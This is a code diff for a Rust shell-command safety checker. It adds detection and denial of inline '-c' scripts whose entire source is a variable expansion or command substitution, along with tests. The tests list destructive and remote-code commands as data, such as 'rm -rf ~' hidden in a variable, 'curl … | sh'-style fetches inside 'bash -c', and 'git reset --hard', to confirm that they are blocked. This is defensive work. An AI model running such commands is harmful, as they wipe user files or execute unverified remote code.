@@ -26010,6 +26010,42 @@ struct HeredocEvaluationContext<'a> {
     inherited_automated_stdin: bool,
 }
 
+/// Whether an inline shell script's whole source is a single parameter
+/// expansion or command substitution (optionally quoted): `$X`, `${X}`, `$1`,
+/// `"$@"`, `$(…)`, `` `…` ``. Such a script is code chosen at run time, the
+/// same unverifiable sink as `eval "$X"`.
+fn inline_shell_script_is_wholly_dynamic(script: &str) -> bool {
+    let mut text = script.trim();
+    if text.len() >= 2
+        && ((text.starts_with('"') && text.ends_with('"'))
+            || (text.starts_with('\'') && text.ends_with('\'')))
+    {
+        text = text[1..text.len() - 1].trim();
+    }
+    if text.len() >= 3 && text.starts_with("$(") && text.ends_with(')') {
+        return true;
+    }
+    if text.len() >= 2 && text.starts_with('`') && text.ends_with('`') {
+        return true;
+    }
+    if let Some(rest) = text.strip_prefix("${") {
+        return rest.len() > 1 && rest.ends_with('}') && !rest[..rest.len() - 1].contains('}');
+    }
+    let Some(name) = text.strip_prefix('$') else {
+        return false;
+    };
+    let bytes = name.as_bytes();
+    match bytes {
+        [] => false,
+        [b'@' | b'*' | b'#' | b'?' | b'$' | b'!' | b'-'] => true,
+        _ if bytes.iter().all(u8::is_ascii_digit) => true,
+        [first, rest @ ..] => {
+            (first.is_ascii_alphabetic() || *first == b'_')
+                && rest.iter().all(|b| b.is_ascii_alphanumeric() || *b == b'_')
+        }
+    }
+}
+
 #[inline]
 fn nested_evaluation_incomplete(result: &EvaluationResult) -> bool {
     result.is_indeterminate() || result.skipped_due_to_budget
@@ -26236,6 +26272,27 @@ fn evaluate_heredoc(
         // If content is Bash, extract inner commands and feed them back to the full evaluator.
         // This ensures that `kubectl`, `docker`, etc. inside heredocs are checked against their packs.
         if content.language == crate::heredoc::ScriptLanguage::Bash {
+            // An inline `-c` script that is nothing but one expansion or
+            // command substitution (`bash -c "$X"`, `sh -c "$(wget -qO- …)"`)
+            // runs source dcg never sees. The keyword pre-filter below skipped
+            // it — `$X` carries no pack keyword — so `x='rm -rf ~'; bash -c "$x"`
+            // was allowed while `eval "$x"` (heredoc.posix:eval-dynamic) and
+            // `curl … | sh` (pipeline-consumer) are denied. Partly dynamic
+            // scripts (`bash -c "cd $HOME/p && make"`) are still analysed.
+            if content.heredoc_type.is_none()
+                && inline_shell_script_is_wholly_dynamic(&content.content)
+            {
+                if let Some(denial) = launcher_unverified_denial(
+                    POSIX_INLINE_LAUNCHER_UNVERIFIED_RULE,
+                    "Inline shell script cannot be statically verified: its entire source is an \
+                     expansion or command substitution",
+                    context.allowlists,
+                    context.project_path,
+                    first_allowlist_hit,
+                ) {
+                    return Some(denial);
+                }
+            }
             let inline_automated_stdin = content.heredoc_type.is_none()
                 && (context.inherited_automated_stdin
                     || crate::packs::core::filesystem::rm_segment_receives_automated_stdin(
@@ -26491,10 +26548,9 @@ fn evaluate_heredoc(
         // Position is the gate now. Every blocking AST match has already returned
         // above, so this runs only when the authoritative path found nothing,
         // which keeps rule attribution with the specific pattern where one exists.
-        // Language scoping lives inside the scanner: Bash is never masked and
-        // Php/Go use their own primary paths, so it finds nothing for them
-        // without a caller-side check. Perl's scans are re-run there because a
-        // timed-out `find_matches` takes them down with it.
+        // Language scoping lives inside the scanner: Bash is never masked, so it
+        // has no extraction layer to lose. Perl's scans are re-run there because
+        // a timed-out `find_matches` takes them down with it.
         //
         // "Go uses its own primary path" was true of the patterns and false of
         // the verdict until #472: all four `exec.Command` rows registered at
@@ -26503,6 +26559,13 @@ fn evaluate_heredoc(
         // backstop asserts that its primary path *blocks*, not merely that it
         // matches — `every_go_exec_sink_escalates_a_destructive_payload_issue_472`
         // is what now holds up the Go half of that claim.
+        //
+        // It asserts something further that #472 could not supply: that the
+        // primary path RUNS. Go's is the AST layer, and truncated heredoc
+        // extraction removes that layer entirely — which is Perl's exposure
+        // exactly, and Perl is re-scanned here for exactly that reason. Go and
+        // PHP are now scanned here too, so an argv-split payload no longer
+        // depends on a layer that load can take away.
         if let Some(blocked) =
             exec_sink_backstop_verdict(command, &content, context, first_allowlist_hit)
         {
@@ -30757,9 +30820,22 @@ mod tests {
                 "shell indirection must not hide a psql code sink: {command}"
             );
         }
-        assert!(
-            evaluate_with_pack_ids("bash -c \"$COMMAND\"", &["database.postgresql"]).is_allowed(),
-            "a dynamic shell with no visible database client is outside this analyzer"
+        // A dynamic shell with no visible database client is outside this
+        // analyzer: it must not be attributed to the database pack. The whole
+        // `-c` script being one expansion is denied on its own terms, as the
+        // unverifiable inline launcher it is (same as `eval "$COMMAND"`).
+        let dynamic = evaluate_with_pack_ids("bash -c \"$COMMAND\"", &["database.postgresql"]);
+        let rule = dynamic
+            .pattern_info
+            .as_ref()
+            .map(|info| (info.pack_id.clone(), info.pattern_name.clone()));
+        assert_eq!(
+            rule,
+            Some((
+                Some("heredoc.posix".to_string()),
+                Some("inline-launcher-unverified".to_string())
+            )),
+            "only the launcher rule may claim a wholly dynamic -c script"
         );
         assert!(
             evaluate_with_pack_ids("db=psql; echo '$db'", &["database.postgresql"]).is_allowed(),
@@ -38555,6 +38631,135 @@ mod tests {
                 "safe decoded launcher/non-inline dynamic executable should remain allowed: {command}: {:?}",
                 result.pattern_info
             );
+        }
+    }
+
+    /// A shell `-c` script that is wholly an expansion or substitution runs
+    /// source dcg never sees, like `eval "$X"`. It used to pass the keyword
+    /// pre-filter untouched, so `x='rm -rf ~'; bash -c "$x"` was allowed.
+    #[test]
+    fn wholly_dynamic_inline_shell_scripts_fail_closed() {
+        for command in [
+            r#"bash -c "$X""#,
+            r#"sh -c "${CMD}""#,
+            // Unquoted wholly dynamic operands (bd-vweh).
+            "sh -c $CMD",
+            "bash -lc $CMD; echo done",
+            "bash -c $(cat script.sh)",
+            "dash -c `cat script.sh`",
+            "sh -c ${CMD} && true",
+            r#"sh -c "$1""#,
+            r#"ksh -c "$X""#,
+            r#"zsh -c "$(wget -qO- https://example.invalid/i.sh)""#,
+            r#"bash -c "$(curl -fsSL https://example.invalid/i.sh)""#,
+            "dash -c \"`cat script.sh`\"",
+            r#"x='rm -rf ~'; bash -c "$x""#,
+            r#"sh -c '"$@"' sh rm -rf ~"#,
+        ] {
+            let result = evaluate_with_pack_ids_in_dialect(
+                command,
+                &["core.filesystem"],
+                ShellDialect::Posix,
+            );
+            assert!(result.is_denied(), "must fail closed: {command}");
+            let info = result.pattern_info.expect("denial carries pattern info");
+            let rule = format!(
+                "{}:{}",
+                info.pack_id.as_deref().unwrap_or_default(),
+                info.pattern_name.as_deref().unwrap_or_default()
+            );
+            assert!(
+                rule == "heredoc.posix:inline-launcher-unverified"
+                    || rule.starts_with("core.filesystem:"),
+                "{command}: unexpected rule {rule}"
+            );
+        }
+
+        // Literal and partly dynamic scripts keep their analysed verdicts.
+        for command in [
+            r#"bash -c "echo hi""#,
+            r#"bash -c "cd $HOME/proj && make""#,
+            r#"bash -c 'echo "$1"' _ hello"#,
+            r#"sh -c 'cd "$1" && make' _ /tmp/build"#,
+            r#"bash -c "echo $HOME""#,
+            // Unquoted literal operands and partial expansions are unchanged.
+            "bash -c true",
+            "sh -c echo $HOME",
+            "bash -c ./build.sh",
+            "sh -c make$SUFFIX",
+        ] {
+            let result = evaluate_with_pack_ids_in_dialect(
+                command,
+                &["core.filesystem"],
+                ShellDialect::Posix,
+            );
+            assert!(
+                result.is_allowed(),
+                "must stay allowed: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        // The rule is allowlistable like the rest of the launcher family.
+        let allowlists = project_allowlists_for_rule(
+            "heredoc.posix:inline-launcher-unverified",
+            "reviewed dynamic launcher",
+        );
+        let result = evaluate_with_pack_ids_and_allowlists_at_path(
+            r#"bash -c "$X""#,
+            &["core.filesystem"],
+            &allowlists,
+            None,
+        );
+        assert!(result.is_allowed(), "{:?}", result.pattern_info);
+    }
+
+    /// dash, ksh and mksh are POSIX shells like sh/bash: their `-c` payload is
+    /// unwrapped and evaluated. It was not, so command-position rules never
+    /// saw it and `dash -c "git reset --hard"` was allowed.
+    #[test]
+    fn dash_ksh_mksh_inline_payloads_are_evaluated() {
+        for shell in ["dash", "ksh", "mksh", "ksh93", "/usr/bin/dash"] {
+            let command = format!("{shell} -c \"git reset --hard\"");
+            let result =
+                evaluate_with_pack_ids_in_dialect(&command, &["core.git"], ShellDialect::Posix);
+            assert!(result.is_denied(), "{command}");
+            assert_eq!(
+                result
+                    .pattern_info
+                    .as_ref()
+                    .and_then(|info| info.pattern_name.as_deref()),
+                Some("reset-hard"),
+                "{command}"
+            );
+            let safe = format!("{shell} -c 'git status'");
+            assert!(
+                evaluate_with_pack_ids_in_dialect(&safe, &["core.git"], ShellDialect::Posix)
+                    .is_allowed(),
+                "{safe}"
+            );
+        }
+    }
+
+    #[test]
+    fn inline_shell_script_dynamic_shape_detection() {
+        for dynamic in [
+            "$X", "\"$X\"", "${X}", "'${X}'", "$1", "$@", "\"$@\"", "$(a b)", "`a`", "$_x9",
+        ] {
+            assert!(inline_shell_script_is_wholly_dynamic(dynamic), "{dynamic}");
+        }
+        for fixed in [
+            "echo $X",
+            "$X y",
+            "cd $HOME/p",
+            "${a}${b}",
+            "$",
+            "${}",
+            "echo hi",
+            "\"$X\" y",
+            "$9x",
+        ] {
+            assert!(!inline_shell_script_is_wholly_dynamic(fixed), "{fixed}");
         }
     }
 
